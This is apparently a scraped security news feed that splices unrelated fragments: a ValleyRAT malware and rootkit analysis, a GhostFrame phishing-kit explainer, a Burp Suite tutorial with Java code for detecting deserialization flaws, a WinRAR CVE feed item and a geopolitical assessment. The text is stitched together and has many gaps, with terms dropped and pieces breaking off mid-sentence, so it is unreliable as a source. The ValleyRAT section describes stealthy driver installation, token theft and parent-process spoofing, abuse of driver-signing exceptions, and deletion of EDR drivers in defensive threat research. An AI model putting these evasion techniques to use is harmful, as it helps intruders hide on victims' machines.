sources. However, after the initial survey, we realized that despite the first report related to ValleyRAT being dated to early 2023, the existing material is quite limited. Most publications discuss only the specific plugins that happened to be deployed to victims or malware labs during analysis, which in many cases means only one or two plugins.When a potential victim, including a malware lab, is infected with the ValleyRAT backdoor, the initial modules deployed are usually first-stage plugins such as the “” or “”. These act as initial beacons and are responsible for retrieving and loading additional plugins from the ValleyRAT C2 server. It is entirely up to the attacker to decide whether a victim appears interesting enough to receive further components and expose more of the backdoor’s capabilities. Many victims, especially malware labs, do not meet this threshold, meaning analysts only get to see the plugins that operators intentionally delivered.Because of this limitation, we shifted our attention to searching for leaked ValleyRAT  and . Normally, materials like these circulate on the dark web within small, restricted communities. Fortunately, in today’s “share whatever, wherever” environment, we were able to obtain them from several publicly available GitHub repositories.ValleyRAT is strongly associated with Chinese-speaking threat actors, so we expanded our search with Chinese keywords and phrases that seemed relevant to the malware. This approach was successful: we found not only the ValleyRAT builder but also its development structure, including Visual Studio solutions and project files. Although the actual , we were still able to link individual Visual Studio projects to plugin binaries extracted from the builder.It is worth mentioning that we achieved these results only after going through many trojanized repositories, including ValleyRAT builders infected with other backdoors. Hackers hacking hackers. Eventually, we located repositories that contained exactly the information we were looking for.In this publication, we focus on a full dissection of the ValleyRAT modular system. We describe the builder, outline our extraction and analysis methodology, and provide detailed explanations for every plugin used by the malware. We also include an in-depth analysis of one of the most interesting components, the “”, which embeds a kernel-mode . Special attention is given to the rootkit and its user-mode client, along with the techniques they implement. Finally, with carefully crafted detection rules for all plugins, we present their in-the-wild detection statistics based on both our internal telemetry and public services.Background & Key FindingsThe first interesting repository we identified is related to the ValleyRAT builder, which also functions as a C2 panel and has been publicly available since March 2025. Below is a comparison between the original Chinese repository and its translated version.The claim about the “Effective date: March 25, 2025” mentioned in the repository structure (with the builder archive itself uploaded on March 26, 2025) correlates with the PE compilation timestamp of the builder: Wednesday, 26.03.2025 04:10:15 UTC. This suggests that it is likely one of the latest versions of the ValleyRAT builder.The second repository, which is slightly older (June 2024), contains development artifacts related to the ValleyRAT plugin system, including Visual Studio solutions and project structures (). A translated version of this repository can be seen below.The fact that the development structure (without source code) has been publicly available for a while suggests that the leaked ValleyRAT source code itself has probably been circulating in the wild as well.Both repositories are in Chinese, and as an initial step, we focused on the one containing the Visual Studio structure. We then attempted to locate matching artifacts inside the compiled builder package from the first repository.While the development structure referenced both “” and “” plugins, only the compiled “” plugins were present inside the builder’s PE resources.During the analysis of the development structure, one component immediately stood out: a plugin named “”, which appears to include a kernel‑mode driver component.We were later able to locate this compiled plugin inside the builder’s resources.The “Driver Plugin” is a DLL that acts as a user‑mode client for an embedded rootkit driver. Its original filename can be recovered from the Export Directory.The rootkit driver is stored within the  section of the . After careful extraction that preserved its original  structure, we identified the exact sample on VirusTotal. The driver retains the original PDB path that closely matches the Visual Studio project path from the development structure.The driver’s compilation timestamp appears intact: Sunday, 23.04.2023 08:10:50 UTC. However, despite being compiled in 2023, it is signed using an expired certificate valid only between . We believe this certificate was stolen and used to sign the driver.Even though the certificate had expired, the signature still fell under the Windows Driver Signing Policy – Exceptions (the legacy driver category). For this reason, the rootkit driver could be loaded even on the latest Windows 11 systems. During our initial investigation, the certificate had not yet been revoked, allowing the driver to load successfully; later revocation prevented this.Using carefully crafted internal detection rules covering the entire ValleyRAT modular system (all “main” plugins and the rootkit driver), we identified approximately 6,000 ValleyRAT‑related samples in the wild between November 2024 and November 2025. Notably, around  of these detections occurred within the last six months of that period, which correlates with the time the ValleyRAT builder first appeared publicly. This clearly reflects the growing adoption of this modular backdoor.Another notable observation is that among the detected samples, we found  of the ValleyRAT builder and  of the rootkit driver. The majority of the detected rootkits were compiled in 2025, based on PE compilation timestamps that appeared intact. Seven of the drivers were still signed with valid (non‑revoked) certificates. Despite all certificates being expired long ago (validity periods ending before 2015), they fall under the driver signing policy exceptions for end‑entity certificates issued before July 29th 2015 that chain to a supported cross‑signed CA. We confirmed that several of these drivers were not properly detected by Microsoft Defender Antivirus, were absent from the latest version of the Microsoft Vulnerable Driver Blocklist, and could still be loaded on fully updated Windows 11 systems with all protection features enabled (including HVCI and Secure Boot).

    main()Using this approach, we successfully extracted all plugins, helper tools, and—most importantly—the rootkit driver, which we analyze in depth later. Among the extracted helper utilities were known third-party tools such as , , and an extended logging library.The core focus, however, is on the extracted “” plugins present in both 32-bit and 64-bit variants. In total, we obtained , and their counts and names (based on VS project structure and compiled PE metadata) match the layout of the original development environment.ValleyRAT Builder: Main PluginsTo verify the functionality of all 38 plugins (19×32-bit + 19×64-bit) along with the ValleyRAT rootkit driver, we automated the reverse-engineering workflow using two AI-assisted approaches: a  and an offline IDA export pipeline, similar to the process described in our publication Generative AI as a Force Multiplier for Reverse Engineering. All automatically generated results were manually validated, with several plugins fully reverse engineered to investigate artifacts and noteworthy code paths highlighted by the AI methods.All plugins are capable of establishing TCP or UDP connections to a specified C2 host and exchanging plugin-specific serialized data, typically encrypted using custom XOR-based schemes. The received data generally correspond to commands that trigger specific plugin functionality. The table below summarizes all available “” plugins and their primary capabilities.Initial-stage module with embedded C2 configuration + remote shellcode execution (in-process by default; optional  injection)Full-featured main-stage agent (login/recon, system fingerprinting, command processing, reflective plugin loading)Remote audio-output capture module (system playback → transmission)Remote Regedit-like module (Windows Registry management)Remote webcam capture and streaming moduleFull-featured remote file managementScreen-locking module with integrated remote chatInteractive remote shell module ()Remote bidirectional-audio module (microphone capture and remote playback)Classic, simple RDP-like control componentMultiplexed reverse-proxy module (tunneling multiple TCP/UDP connections over a single control channel)Keylogger with clipboard harvestingRemote system-management module (reconnaissance, command processing, process/service control, code injection)High-frame-rate remote screen capture moduleAdvanced hidden RDP-like remote desktop module with web-browser automationRemote screen-capture video streaming (using libx264)Feature-rich remote DDoS module (supports multiple modes of TCP/UDP/HTTP/ICMP/RawIP floods)Identical to the “Online Module”, compiled as PE Advanced driver-related module (rootkit loader and user-mode client)ValleyRAT Builder: Auxiliary PluginsThe “” plugins are not included in the compiled ValleyRAT builder, meaning their functionality could not be verified through reverse engineering of actual binaries.

From a research perspective, the most interesting components are those capable of providing rare or high-impact capabilities. For that reason, the next section focuses on the ValleyRAT ”, particularly its embedded kernel-mode rootkit.Technical Analysis: ValleyRAT Rootkit PluginThe ValleyRAT rootkit module is embedded inside one of the “main” plugins, originally named  (EN: ). This plugin is compiled in both 32-bit and 64-bit variants and acts as the user-mode client and installer for the rootkit. The embedded driver itself, however, is always a 64-bit kernel-mode binary. It functions as a Windows kernel device, a file system minifilter, a registry filter, and a process/thread monitoring driver.ValleyRAT Rootkit Plugin: User-Mode ClientThe user-mode client () serves as the controller for the kernel rootkit. It maintains an active TCP/UDP connection to the C2 server and processes inbound commands. Each command is translated into an appropriate , which is then sent to the driver to control its runtime behavior. Supported operations include: ( or  mode)Enable or disable the driverAdd or remove hidden objects (files, directories, registry keys, and registry values)Add or remove protected processesEnumerate protected objectsForce-delete arbitrary filesTrigger user-mode shellcode injection via the rootkit driverUpdate driver configuration valuesDriver Installation and Initial Configuration:When executing the driver installation command in  (calling  directly), the client drops the embedded driver to disk and installs it as a kernel service named , creating the corresponding key: HKLM\SYSTEM\CurrentControlSet\Services\kernelquick\. The service is registered as a  with .During installation, the client writes the initial configuration values used by the driver to hide and protect itself: (list of files to hide)KernelQuick_ProtectedImages (process images to protect)Additional configuration values can be set to control stealth and filtering behavior: (on/off for overall functionality) (whether to hide the driver/service) (list of directories to hide) (registry keys to hide)KernelQuick_HideRegValues (registry values to hide)KernelQuick_IgnoredImages (process images to ignore/exclude)KernelQuick_hideFS_comprise (additional file hiding rules)All these configuration values define the hiding rules, protection lists, and ignore lists the driver uses. Any of them can be updated later through the corresponding IOCTL operations issued by the client (triggered by a command from the C2 server).Driver Installation: Stealth Mode (MalSeclogon-Based):In addition to the “” of the driver installation described above, the client can also trigger “”. In that case, the  function is supplemented by additional routines: , CreateProcessMalseclogon().This mode primarily aims to disrupt network connectivity during installation and use MalSeclogon-based to reduce detection likelihood. To disrupt network connectivity, the client launches commands such as cmd /c start /min ipconfig /release and cmd /c start /min ipconfig /renew. The MalSeclogon technique is then used to execute these commands under an impersonated context with : locates the PID of  (Desktop Window Manager) using the FILE_INFORMATION_CLASS::FileProcessIdsUsingFileInformation. This approach reliably returns the correct PID without causing false positives.The client temporarily modifies the TEB → ClientId.UniqueProcess field to spoof the  to .Token objects are stolen from the  process and used to invoke commands via:
 (primary) (fallback, maintains  spoofing but )After the commands are executed, the client restores the original  value.Driver installation via  occurs during the network disruption window.The result is a stealthy installation sequence executed under a trusted Windows process, significantly reducing behavioral detection signals. The following process tree shows how this activity appears when Stealth Mode is used:User‑Mode Shellcode Storage and Injection:The client also supports user-supplied shellcode injection, storing the operator-provided shellcode inside .When commanded, the rootkit retrieves this user-mode shellcode and performs :Into  during initial activationInto  supplied via IOCTLValleyRAT Rootkit Plugin: Kernel-Mode Rootkit DriverThe embedded 64-bit driver is based on the publicly available open-source project Hidden. The ValleyRAT authors significantly modified the original codebase, introducing refactoring changes, compatibility improvements for recent Windows versions, and entirely new functionality not present in the original project. Like the original  rootkit, the ValleyRAT driver acts as a kernel device, file system minifilter, registry filter, and process/thread monitoring driver.During initialization, it creates a device named  and assigns IrpDeviceControlHandler() as its device-control dispatcher for IOCTL communication with the user-mode client.Differential Analysis Methodology:Because the ValleyRAT driver is derived from a publicly accessible codebase, we focused our reverse-engineering efforts on only the modified functionality to maximize efficiency.Rebuilt the original Hidden rootkit using the configuration extracted from the leaked ValleyRAT Visual Studio project.Loaded the rebuilt driver into IDA, applied the PDB symbols, and created strict FLIRT signatures.Generated a Diaphora database for structural diffing.Loaded the ValleyRAT driver, applied the FLIRT signatures, and created its own Diaphora database.Performed a differential analysis between the two drivers.This approach allowed us to:Automatically match preserved functionsHighlight substantial refactoringIsolate genuinely new ValleyRAT functionalityOut of roughly 200 functions, only ~25 remained unmatched, representing the newly introduced ValleyRAT features. From this point on, we could concentrate exclusively on analyzing these new additions. A simplified overview of the modifications between the ValleyRAT rootkit and the original Hidden rootkit is shown below.Preserved functionality (from the original Hidden rootkit):Registry hiding (keys and values)File and directory hidingProcess protection (setting limited access to processes)Process exclusion lists (exclude specific processes from protection features)Process hiding (unlinking from active process lists) – Removed entirely due to BSOD risk triggered by modern Windows mitigations such as PageGuard.Registry keys used for initialization were renamed or reorganized.

It locates a suitable thread, queues a , and triggers , which allocates user-mode memory, writes the shellcode, and queues a  to execute it.Added functionality: ForceDeleteFile() is a custom low-level re-implementation of file deletion using direct kernel IRP calls. Opens files via a custom Resets attributes via  ()Marks files for deletion via FileDispositionInformationTemporarily detaches section objects to bypass file locks, including memory-mapped executables during driver initialization (see Appendix A – Targeted Deletion of EDR/AV Drivers)Via  from the user-mode clientAdded functionality: SetDriverStartType_SystemStart()This function updates the  service to use , elevating persistence from on-demand loading to loading at system startup.In summary, the comparison between the original Hidden rootkit and the ValleyRAT-adapted variant shows that the authors did not rewrite the rootkit from scratch. Instead, they selectively refactored and modernized the existing codebase to ensure its continued viability on current Windows versions. Most changes revolve around structural refactoring, updated APIs, and compatibility adjustments that allow the rootkit to function reliably on Windows 10 and Windows 11 systems.The newly introduced components—roughly 25 functions out of an otherwise large and legacy-heavy codebase—represent targeted functionality upgrades rather than a major redesign. These additions primarily reinforce the rootkit’s integration with the wider ValleyRAT ecosystem, improve persistence and communication paths, and address stability issues caused by OS-level changes over the past decade.Overall, the modifications reflect a pragmatic development approach: preserve the core functionality of a proven rootkit, update the parts that would break on modern systems, and extend the code just enough to support ValleyRAT’s operational requirements. This strategy gives the actor a working kernel-mode stealth component while avoiding the engineering cost and detection risk associated with designing a new rootkit from scratch.In this publication, we fully dissected the ValleyRAT modular system and mapped out every major component of its architecture. We analyzed all available plugins, documented their capabilities, and provided a comprehensive view of how they operate as part of a larger, well-structured backdoor ecosystem. By sharing these findings, we aim to strengthen the collective understanding of this widespread and actively abused malware family and contribute to better defensive measures across the security community.Throughout the analysis, one theme remains consistent: the developers behind ValleyRAT possess a deep understanding of internal Windows mechanisms. Many plugins implement functionality that requires reversing complex kernel‑mode and user‑mode structures, undocumented behavior, and sensitive system interactions. The overall design shows a level of consistency across different modules that strongly suggests a small, tightly coordinated development team rather than a loosely assembled collection of contributors.A significant part of our research focuses on the ValleyRAT kernel‑mode rootkit driver. We reverse engineered the  used by ValleyRAT and compared it against the  rootkit. Despite relying on an older codebase, the actor successfully adapted it for modern Windows platforms through  and compatibility updates. More concerning is the fact that we observed  samples  with technically  certificates, allowing the driver to load even on  systems with . This highlights a real-world security gap and demonstrates the ongoing operational capability of the threat actor’s tooling.The broader threat landscape reflects similar trends. More than  of all ValleyRAT samples we observed appeared within the , closely correlating with the period shortly after the builder was leaked. With the full build chain now publicly available, continued growth in  is not only expected but , especially as more actors experiment with the leaked tooling.Finally, the public availability of both the builder and the source code . While ValleyRAT has historically been linked to Chinese-affiliated threat activity, including groups like Silver Fox, the current situation makes such . Anyone can now compile, modify, and deploy ValleyRAT independently, blurring previous indicators and making traditional attribution approaches far less meaningful.ValleyRAT has effectively transitioned from a previously actor-linked threat to an openly available malware framework with an active and accelerating presence in the wild. Our goal with this research is to provide defenders with the technical depth needed to , , and  this evolving threat.Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, filetypes, and operating systems and protect against the attacks and threats described in this report.Appendix A – Targeted Deletion of EDR/AV DriversTable providing details about the

A few months later, they had linked over a million attempts to this same kit, which they named GhostFrame for its stealthy use of iframes. The kit hides its malicious activity inside iframes loaded from constantly changing subdomains.An iframe is a small browser window embedded inside a web page, allowing content to load from another site without sending you away–like an embedded YouTube video or a Google Map. That embedded bit is usually an iframe and is normally harmless.GhostFrame abuses it in several ways. It dynamically generates a unique subdomain for each victim and can rotate subdomains even during an active session, undermining domain‑based detection and blocking. It also includes several anti‑analysis tricks: disabling right‑click, blocking common keyboard shortcuts, and interfering with browser developer tools, which makes it harder for analysts or cautious users to inspect what is going on behind the scenes.As a PhaaS kit, GhostFrame is able to spoof legitimate services by adjusting page titles and favicons to match the brand being impersonated. This and its detection-evasion techniques show how PhaaS developers are innovating around web architecture (iframes, subdomains, streaming features) and not just improving email templates.Hiding sign-in forms inside non‑obvious features (like image streaming or large‑file handlers) is another attempt to get around static content scanners. Think of it as attackers hiding a fake login box inside a “video player” instead of putting the login box directly on the page, so many security tools don’t realize it’s a login box at all. Those tools are often tuned to look for normal HTML forms and password fields in the page code, and here the sensitive bits are tucked away in a feature that is supposed to handle big image or file data streams.Normally, an image‑streaming or large‑file function is just a way to deliver big images or other “binary large objects” (BLOBs) efficiently to the browser. Instead of putting the login form directly on the page, GhostFrame turns it into what looks like image data. To the user, it looks just like a real Microsoft 365 login screen, but to a basic scanner reading the HTML, it looks like regular, harmless image handling.Generally speaking, the rise of GhostFrame illuminates a trend that PhaaS is arming less-skilled cybercriminals while raising the bar for defenders. We recently covered Sneaky 2FA and Lighthouse as examples of PhaaS kits that are extremely popular among attackers.But as always, you’re the first line of defense. Don’t click on links in unsolicited messages of any type before verifying and confirming they were sent by someone you trust. Staying informed is important as well, because you know what to expect and what to look for.And remember: it’s not just about trusting what you see on the screen. Layered security stops attackers before they can get anywhere.Another effective security layer to defend against phishing attacks is Malwarebytes’ free browser extension, Browser Guard, which detects and blocks phishing attacks heuristically.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

Oftentimes, the criminal actor will express significant claims of violence towards the loved one if the ransom is not paid immediately. The criminal actor will then send what appears to be a genuine photo or video of the victim’s loved one, which upon close inspection often reveals inaccuracies when compared to confirmed photos of the loved one. Examples of these inaccuracies include missing tattoos or scars and inaccurate body proportions. Criminal actors will sometimes purposefully send these photos using timed message features to limit the amount of time victims have to analyze the images.Images, videos, audio: It can all be faked with AI. My guess is that this scam has a low probability of success, so criminals will be figuring out how to automate it.]]></content:encoded></item><item><title>Warning: WinRAR Vulnerability CVE-2025-6218 Under Active Attack by Multiple Threat Groups</title><link>https://thehackernews.com/2025/12/warning-winrar-vulnerability-cve-2025.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn4WUzO_P0sEPntxbBi-a6uO4dqk0arqJQMhRKYAYj7r8Dbsx3Y7PoeWrMLaEHxK7nMx4vNCTNWFYa6KYRiFFYE2i2Lg3WkD0DO63RN4Nxnt_MSOKAHmb9Z6vsIKaHVVBQLmBTVs0fgsSAomShvnBP25jt1DK11qLYEiqOg0_HsJakDdxnA45GzohEBYT7/s1600/winrar.jpg" length="" type=""/><pubDate>Wed, 10 Dec 2025 11:54:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added a security flaw impacting the WinRAR file archiver and compression utility to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.

As we saw in Part 8, none of the checks implemented for the active scanner in Part 6 and Part 7 could be defined using BChecks. In the case of Part 6, this is because BChecks currently do not allow to obtain the response time, and in the case of Part 7, it is not possible to perform operations on byte arrays, which are necessary for constructing the payloads used in that particular extension.Now, since version 2025.9.5 of Burp Suite, we can also extend Burp Suite Scanner without a dedicated extension with a , in a similar way of what we do with  filters present in many Burp Suite tools. This new functionality has been grouped with BChecks under the new “Custom scan checks” extension tab. With this new powerful option, we can create a custom scan check with almost all the functionalities we have in a standalone extension. Obviously, for complex scenarios, a full-blown external extension may be the best (or the only viable) option, but if our check is not too complex and does not require external libraries, custom scan checks are a great option (actually, in the Extender settings we can point Burp to a folder where it will look for Java libraries; I don’t think we can call them from custom scan checks, but to be honest I haven’t tried yet).Custom scan checks can be created, enabled/disabled, imported/exported, deleted, etc. in the Extensions tab of Burp Suite, in the “Custom scan check” tab. This tab has replaced the old “BChecks” tab, because now you can create both Java-like scan checks and YAML-like BChecks.The development environment is the same we saw in the BChecks article. We have a full development environment that can be used to develop, test, and try the custom scan checks. We have tools to , check if syntax is correct,test on sample requests/responses, a dedicated Logger, Issue activity, and Event log tabs. Refer to Part 8 for a full description of the development environment.We can create the following types of Java-like custom scan checks:Type:  – > Active checks can make request to actively probe for vulnerabilities
Check runs: Per insertion point -> Executed once per insertion point; most common type of operation that add payload in parameters, headers, and cookies (e.g., probe for SQL Injection in a GET parameter)Check runs: Per request -> Executed once per request; commonly used for checks that manipulate the full request or response (e.g., payload that replaces the request body)Check runs: Per host -> Executed once per host; commonly used for checks that require only host information (e.g., check for the presence of the “/manager/html” admin interface)Type:  -> Passive checks should analyze traffic without making any new request
Check runs: Per request -> Executed once per request; commonly used for checks that analyze the full request or response (e.g., check for the presence of serialized objects in requests/responses)Check runs: Per host -> Executed once per host; commonly used for checks that execute analysis on properties that should be consistent across the same host (e.g., security headers or information leakage on “Server” header)Depending on the plugin type and check run, we have different objects available from our code. We can inspect the available objects as follows:The HttpRequestResponse object (parameter ), that contains the request/response currently analyzedThe MontoyaApi object (parameter ), that is the core of each Montoya plugin (as we saw in previous articles) and give access to all Burp Suite tools and instrumentsActive plugins can also access an Http object (parameter ) that can be used to send requests (that I think is the same object that we can get directly from the MontoyaApi object with  ). Finally, active checks executed per insertion point have also an AuditInsertionPoint object (parameter ) with details on the specific insertion point and useful functions to create copies of the target request with our payload in the current insertion point.We already saw all these objects in Part 6 and Part 7, because they are exactly the same objects used in external Montoya scanner extensions. All plugins must return an AuditResult object, that contains the found issues (and that is again the same object returned in external scanner extensions).So, in Part 8 we saw some BChecks examples, but we could not implement checks of Part 6 and Part 7 due to some BCheck limitations. Now, using the new Java-like script engine we can implement those checks. So, let’s port them! We will use the same target application and environment for this purpose: a Java application that deserializes the input sent to it, packaged with a vulnerable version of the Apache Commons Collections 3 library, which offers one of these serializable objects that allow for the execution of arbitrary Java code once deserialized. The sample target application can be downloaded from my Github repository. To deploy it, a Java application server is necessary. I used , which is easy to configure (for details on the vulnerable environment refer to Part 6).Let’s start with the  we coded in Part 6, that tries to detect Java serialization vulnerabilities using a sleep payload for the Apache Commons Collections 3 library. We implemented this check as follows:@Override
public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {

    // Inizialize an empty list of audit issues that we will eventually populate and return at the end of the function
    List<AuditIssue> activeAuditIssues = new ArrayList<AuditIssue>();

    // For each CommonsCollections 3 payload we defined, we try to exploit the issue
    for(int i = 0; i< StaticItems.apacheCommonsCollections3Payloads.length; i++) {

        // We create an HTTP request containing our payload in the current insertion point
        HttpRequest commonsCollectionsCheckRequest = auditInsertionPoint.buildHttpRequestWithPayload(
                ByteArray.byteArray(StaticItems.apacheCommonsCollections3Payloads[i]))
                .withService(baseRequestResponse.httpService());

        // We record the current time, execute the request and record the time again
        long startTime = System.nanoTime();
        HttpRequestResponse commonsCollectionsCheckRequestResponse = api.http().sendRequest(commonsCollectionsCheckRequest);
        long endTime = System.nanoTime();

        // We calculate the internal between when we sent the request and when we received the response (converted in seconds)
        long duration = TimeUnit.SECONDS.convert((endTime - startTime), TimeUnit.NANOSECONDS);

        // If the internval is greater than 9 seconds we may have a vulnerable endpoint (our payloads sleep for 10 seconds)
        if (((int) duration) >= 9) {

            // In this case, we create an issue object and adds it to the list of issues to be returned
            AuditIssue auditIssue = AuditIssue.auditIssue(StaticItems.apacheCommonsCollections3IssueName,
                    StaticItems.apacheCommonsCollections3IssueDetail,
                    null, // remediation
                    baseRequestResponse.request().url(),
                    StaticItems.apacheCommonsCollections3IssueSeverity,
                    StaticItems.apacheCommonsCollections3IssueConfidence,
                    null, // background
                    null, // remediationBackground

                    commonsCollectionsCheckRequestResponse); //Request/response can be highlighted

            activeAuditIssues.add(auditIssue);

        }

}This is an  scan check, that should apply to. So, we should configure the new custom scan check accordingly.The code of the ported custom scan check is the following:/**

return AuditResult.auditResult(activeAuditIssues);In this check we used the , the  and the  objects made available to us (in this example we did not use the  object because we need only the other objects for this particular check; we will use the  object in a later example).As we can see, the code is almost the same. I only moved payloads and issue detail directly in the check (while in a structured plugin I can move this information outside to make the code more readable) and I made a little change in the way I calculate the timing of the response. In my previous example, I calculated the time “manually”, because the code was partially copied from my Java Deserialization Scanner plugin, created with the legacy Burp Extender APIs. With the Montoya API we have a better way to calculate the time of the response, thanks to the timing information recorded in the HttpRequestResponse object, not present in the legacy APIs. With the new Montoya API we can easily extract the milliseconds between request sent and start of response received as follows:HttpRequestResponse commonsCollectionsCheckRequestResponse = http.sendRequest(commonsCollectionsCheckRequest);
Optional<TimingData> requestWithPayloadTiming = commonsCollectionsCheckRequestResponse.timingData();
if(requestWithPayloadTiming.isPresent()) {
    Duration requestWithPayloadTimingMs  = requestWithPayloadTiming.get().timeBetweenRequestSentAndStartOfResponse();
    long millis = requestWithPayloadTimingMs.toMillis();
}

    // Improvement -> Search all matches with a while instead of an if

    // If we found the magic bytes we report the passive issue
    if(indexOfSerializationMagicBytes != -1 || indexOfBase64MagicBytes != -1) {

        // Calculate the indexes to highligh the start of the serialized object in the request

As before, the code is almost identical. I only moved issue details and other static data inside the check, without any important modification in the code. In this example, I used only the  object.Finally, we will port the  active check that we wrote in Part 7, that detects serialization issues using different serialized objects that, once deserialized, cause the DNS resolution of arbitrary domains (so, our detection will be based on external interactions rather than on timing).Let’s have a look at the original code:// This method create serialized objects with specific Collaborator URLs. Serialized object are binary

return AuditResult.auditResult(activeAuditIssues);As in the previous examples, almost nothing changes. We moved the auxiliary method we used to create the payload inside our check.

In this example, we want to use only the custom scan checks, so we can leave them enabled and disable all built-in checks and all the extension checks (this is another cool feature that is relatively new; in the past we could not disable the extension checks in scan profiles).After a while, we have our result!And for custom scan checks, that’s a wrap.As always, the complete code can be downloaded from my GitHub repository. Custom scan scripts are present both with Java and Bambda extension.

An increase in US sanctions is likely to drive each state to pursue alternative markets; this motivation has led to an acceleration of trilateral cooperation in some areas, and a reduction in others. For example, President Donald Trump’s decision to impose tariffs on India in mid-2025 very likely amplified a warming China-India relationship and reinforced a stable India-Russia relationship. In contrast, US sanctions on Russian oil companies in October 2025 led China and India to decrease their level of Russian oil imports.The second factor driving Russia, India, and China to explore trilateral cooperation is very likely their shared strategic interest in a multipolar global order — manifest through fora like SCO and BRICS (Brazil, Russia, India, China, and South Africa).However, despite nascent trilateral cooperation, there remains significant divergence among the three countries’ foreign policy goals, governing principles, and economic ambitions, which likely limits the scope of their cooperation. The political, economic, and military dynamics that shape bilateral relationships between China-Russia, China-India, and India-Russia are complex and distinct. Of those relationships, challenges between Beijing and New Delhi are almost certainly the greatest barrier to the formation of a trilateral bloc or alliance. In particular, India’s competition with China for Asia-Pacific regional leadership and influence, a large trade deficit favoring China, and unresolved border disputes will very likely temper the depth of cooperation between the two. All three countries seek to create an alternative center of gravity to the West, but India does not share Russia’s or China’s staunchly anti-Western worldview.Although BRICS and SCO almost certainly represent viable opportunities for the three countries to foster trilateral cooperation, significant limitations prevent deeper alignment within these fora. The Russia-India-China (RIC) dialogue format, if rejuvenated, would offer the most likely format to formalize trilateral alignment. Insikt Group identified a range of potential indicators that are likely to reflect a coalescence into a political, economic, or military bloc.Deepening trilateral coordination would almost certainly have broad implications for both the public and private sectors, depending on the depth and intensity of the cooperation. For example, the formation of trilateral economic frameworks, such as lower trade barriers or coordinated regulatory schemes, would force private sector companies operating in any of these countries to adapt to new regulatory standards and potentially face increased competition from an enlarged trilateral economic market. Deeper defense cooperation could lead to shifts in the defense industry of each country, as markets adjust to serve the defense needs of each member of the trilateral. If this leads Chinese and Indian defense industries to increasingly look to serve Russian defense needs, it could force companies that currently produce dual-use technologies for China and India to make adjustments to avoid transacting with sanctioned Russian defense entities.The single greatest impediment to trilateral cooperation is very likely the deep distrust between China and India, which underpins political, economic, and military competition — including a decades-long border dispute. India’s doctrine of strategic autonomy and its pursuit of “multi-alignment” are likely to limit its willingness to join a formal trilateral bloc with China and Russia that is explicitly positioned as a counterweight to the West.However, all three states very likely share a desire for a multipolar world that includes more developed regional centers of power. This likely helps drive trilateral cooperation to avoid US influence that threatens the strategic interests of Russia, China, and India.The nearly decade-long strategic partnership between Moscow and Beijing is likely a key factor driving trilateral cooperation, as Russia and China have shared experience developing alternative centers of power to the West. Both states are likely motivated to convince India to adopt a similar strategy.An increase in US sanctions and tariffs is very likely to be a primary factor driving greater trilateral cooperation, as all three states seek alternative markets and China and India likely aim to avoid secondary sanctions. In contrast, Western government policies that facilitate China’s and India’s access to Western markets are likely to lessen Beijing’s and New Delhi’s incentive to deepen trilateral economic cooperation.Deepened trilateral economic cooperation very likely would increase the prospect that Western companies — especially those operating in India — see heavier state involvement in the private sector and greater Western scrutiny of Indian economic transactions to catch sanctions violations, as New Delhi aligns its practices with Moscow and Beijing.Background: US Policy Likely Driving Nascent Cooperation Among China, India, and RussiaWe assess that there are early signs of cooperation among India, China, and Russia in recent months and that this cooperation is likely to expand, driven primarily by an emerging thaw in China-India relations. Against the backdrop of strong India-Russia and China-Russia relations, this warming of China-India relations likely increases the prospect of a deeper trilateral relationship. However, a formal China-India-Russia bloc has not yet formed, and significant limitations –– particularly around Beijing-New Delhi tensions –– are likely to challenge such an alignment.India has likely calculated that the US’s 50% tariff on Indian exports –– imposed on India in August 2025, comprising a 25% reciprocal tariff and a 25% “penalty” tariff due to India purchasing sanctioned Russian oil –– necessitateslooking for alternative markets and deepening foreign partnerships to recoup lost revenue and reinforce relationships India likely views as more reliable, including cultivating its relationship with Beijing. On August 6, 2025, one day before the US imposed a 50% tariff on Indian exports to the US, the Indian Ministry of External Affairs called the US’s decision “unfair” and “unjustified” and vowed that India would “take all actions necessary to protect its national interests.” India has specifically highlighted the inconsistency in the US’s application of a penalty tariff on India for importing Russian oil, while other countries, “even those with more adversarial relations with Russia,” have also sourced oil from Russia. China’s increasing oil imports from Russia likely reinforced to New Delhi that the US’s tariff policy was unjust. Indian officials are reportedly monitoring the US Supreme Court case (challenging the Trump administration’s tariffs) to determine its impact on current US-India trade negotiations. A breakthrough in trade talks would likely improve, but not entirely repair, the deteriorating diplomatic and economic ties between India and the US.The US tariffs have likely also reinforced an emergent reconciliation between India and China. In August 2025, Chinese Foreign Minister Wang Yi visited New Delhi for the first time in three years. Beijing likely sees economic and political benefit to deepening ties with India, including exploiting the Indian market for Chinese exports and curbing US influence in South Asia. China’s trade surplus with India and status as the top exporter of electronics, telecommunications, and machinery to India likely give Beijing economic leverage in negotiations with India, particularly as India looks to recoup revenue lost due to US tariffs.Following Modi’s August 31, 2025, meeting with Xi –– Modi’s first visit to China in seven years, at the SCO Summit in Tianjin –– Modi stated that “a stable relationship and cooperation” between China and India was critical for “the growth and development of the two countries, as well as for a multipolar Asia befitting the trends of the 21st century.” Amid India’s stated frustration over US tariffs, the highly publicized friendly interaction between Modi, Xi, and Putin  at the SCO Summit sparked concerns over an emergent Russia-India-China troika.Photo posted by Modi of himself with Putin and Xi at the SCO Summiton August 31, 2025 (Source: Social Media)The nascent warming of China-India relations likely makes deeper trilateral cooperation among China, India, and Russia more probable, as China and Russia, as well as India and Russia, already have strong relations. Thus, a warming China-India relationship ameliorates the biggest barrier to the formation of a trilateral dynamic. In addition, all three states likely see political and economic benefits to deepening cooperation.Areas of Bilateral Intersection and Divergence Among China, India, and RussiaDeepening trilateral cooperation among China, India, and Russia likely serves the strategic foreign policy interests of each state, though the trajectory of any fully formed trilateral dynamic is likely to be shaped by nuanced differences among each state’s foreign policy, as well as the bilateral dynamics within this group.China’s foreign policy toward Russia and India is almost certainly an outgrowth of the country’s primary strategic objectives. These include China’s “core interests,” such aspreserving the CCP’s political power, territorial integrity, and economic development, as well as China’s efforts to shape a “multipolar” world, which almost certainly entails independence from US coercion, an increase in China’s international influence, and greater global dependence on China. China very likely sees greater cooperation with Russia and India as supporting these goals, especially in relation to 